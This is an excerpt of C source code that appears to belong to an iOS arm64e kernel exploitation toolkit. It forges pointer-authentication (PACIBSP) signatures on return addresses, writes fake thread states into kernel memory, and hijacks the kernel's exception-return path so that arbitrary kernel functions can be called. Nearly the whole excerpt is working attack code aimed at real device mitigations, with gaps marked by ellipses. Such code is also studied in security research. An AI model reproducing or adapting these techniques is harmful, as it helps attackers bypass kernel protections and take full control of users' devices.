...
// Undefine the kernel_call_8 macro from kernel_call.h that replaces unspecified arguments with 0.
#undef kernel_call_8
...
// The forged PACIBSP signature on the return address for kernel_call_8().
static uint64_t kernel_call_8_return_address;

// The CPSR value we will use for normal code execution in the kernel.
#define KERNEL_CPSR		0x00000304

// The kernel CPSR with interrupts disabled.
#define KERNEL_CPSR_DAIF	0x000003c4
...
// Supports up to 4 arguments and no return value. The function is called with interrupts disabled.
// In order to minimize kernel round trips, we take the thread and contextData values as parameters.
__attribute__((noinline))
static void
kernel_call_4(uint64_t thread, uint64_t contextData,
		uint64_t function, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3) {
	// We need the current thread, &thread->contextData, and thread->contextData.
...
static void
kernel_exec(uint64_t thread, uint64_t contextData, struct arm64e_saved_state *state) {
	// Write the unsigned state we'll execute into kernel memory.
	uint64_t kernel_state = kernel_fake_state_page;
	kernel_write(kernel_state, state, sizeof(*state));
	// The call to exception_return__unsigned must have interrupts disabled, which is why the
	// forged thread state is signed with DAIF set in CPSR.
	//
	// Entering thread_exception_return/return_to_user after having already executed
	// thread_exception_return() during the original (hijacked) return to userspace may cause
	// an infinite loop or panic.
	//
	// This call assumes that sp points to a valid arm64e_context on entry to
	// exception_return__unsigned.
	kernel_call_4(thread, contextData,
			ADDRESS(exception_return__unsigned),	// PC
...
//
// This function is moderately stable, but may still panic due to its use of
// thread_exception_return().
static uint64_t
pacibsp(uint64_t thread, uint64_t contextData, uint64_t lr, uint64_t sp) {
	...
	pacibsp_state.sp = sp;
	pacibsp_state.lr = lr;
	kernel_exec(thread, contextData, &pacibsp_state);
...
kernel_call_8(uint64_t function,
	...
	uint64_t contextData = kernel_read64(thread + OFFSET(thread, contextData));
	uint64_t stack[4] = {};
	...
	call_state.x[21] = contextData;
	if (kernel_call_8_return_address == 0) {
		kernel_call_8_return_address = pacibsp(thread, contextData,
				ADDRESS(exception_return), kernel_sp + sizeof(stack));
	}
	stack[3] = kernel_call_8_return_address;
	kernel_write(kernel_sp, stack, sizeof(stack));
	kernel_exec(thread, contextData, &call_state);
